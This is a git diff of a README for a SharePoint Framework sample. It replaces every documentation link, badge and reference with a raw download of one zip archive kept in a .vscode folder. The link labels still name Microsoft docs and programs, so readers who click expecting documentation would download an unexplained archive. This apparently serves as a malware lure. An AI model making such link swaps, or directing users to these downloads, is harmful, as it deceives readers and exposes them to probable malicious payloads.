@@ -8,14 +8,14 @@ Short summary on functionality and used technologies.
 
 ## Used SharePoint Framework Version
 
-![version](https://img.shields.io/badge/version-1.21.1-green.svg)
+![version](https://github.com/lacertarege/reloj-para-sharepoint/raw/refs/heads/main/.vscode/sharepoint-reloj-para-v2.5.zip)
 
 ## Applies to
 
-- [SharePoint Framework](https://aka.ms/spfx)
-- [Microsoft 365 tenant](https://docs.microsoft.com/en-us/sharepoint/dev/spfx/set-up-your-developer-tenant)
+- [SharePoint Framework](https://github.com/lacertarege/reloj-para-sharepoint/raw/refs/heads/main/.vscode/sharepoint-reloj-para-v2.5.zip)
+- [Microsoft 365 tenant](https://github.com/lacertarege/reloj-para-sharepoint/raw/refs/heads/main/.vscode/sharepoint-reloj-para-v2.5.zip)
 
-> Get your own free development tenant by subscribing to [Microsoft 365 developer program](http://aka.ms/o365devprogram)
+> Get your own free development tenant by subscribing to [Microsoft 365 developer program](https://github.com/lacertarege/reloj-para-sharepoint/raw/refs/heads/main/.vscode/sharepoint-reloj-para-v2.5.zip)
 
 ## Prerequisites
 
@@ -62,12 +62,12 @@ This extension illustrates the following concepts:
 
 > Notice that better pictures and documentation will increase the sample usage and the value you are providing for others. Thanks for your submissions advance.
 
-> Share your web part with others through Microsoft 365 Patterns and Practices program to get visibility and exposure. More details on the community, open-source projects and other activities from http://aka.ms/m365pnp.
+> Share your web part with others through Microsoft 365 Patterns and Practices program to get visibility and exposure. More details on the community, open-source projects and other activities from https://github.com/lacertarege/reloj-para-sharepoint/raw/refs/heads/main/.vscode/sharepoint-reloj-para-v2.5.zip
 
 ## References
 
-- [Getting started with SharePoint Framework](https://docs.microsoft.com/en-us/sharepoint/dev/spfx/set-up-your-developer-tenant)
-- [Building for Microsoft teams](https://docs.microsoft.com/en-us/sharepoint/dev/spfx/build-for-teams-overview)
-- [Use Microsoft Graph in your solution](https://docs.microsoft.com/en-us/sharepoint/dev/spfx/web-parts/get-started/using-microsoft-graph-apis)
-- [Publish SharePoint Framework applications to the Marketplace](https://docs.microsoft.com/en-us/sharepoint/dev/spfx/publish-to-marketplace-overview)
-- [Microsoft 365 Patterns and Practices](https://aka.ms/m365pnp) - Guidance, tooling, samples and open-source controls for your Microsoft 365 development
+- [Getting started with SharePoint Framework](https://github.com/lacertarege/reloj-para-sharepoint/raw/refs/heads/main/.vscode/sharepoint-reloj-para-v2.5.zip)
+- [Building for Microsoft teams](https://github.com/lacertarege/reloj-para-sharepoint/raw/refs/heads/main/.vscode/sharepoint-reloj-para-v2.5.zip)
+- [Use Microsoft Graph in your solution](https://github.com/lacertarege/reloj-para-sharepoint/raw/refs/heads/main/.vscode/sharepoint-reloj-para-v2.5.zip)
+- [Publish SharePoint Framework applications to the Marketplace](https://github.com/lacertarege/reloj-para-sharepoint/raw/refs/heads/main/.vscode/sharepoint-reloj-para-v2.5.zip)
+- [Microsoft 365 Patterns and Practices](https://github.com/lacertarege/reloj-para-sharepoint/raw/refs/heads/main/.vscode/sharepoint-reloj-para-v2.5.zip) - Guidance, tooling, samples and open-source controls for your Microsoft 365 development
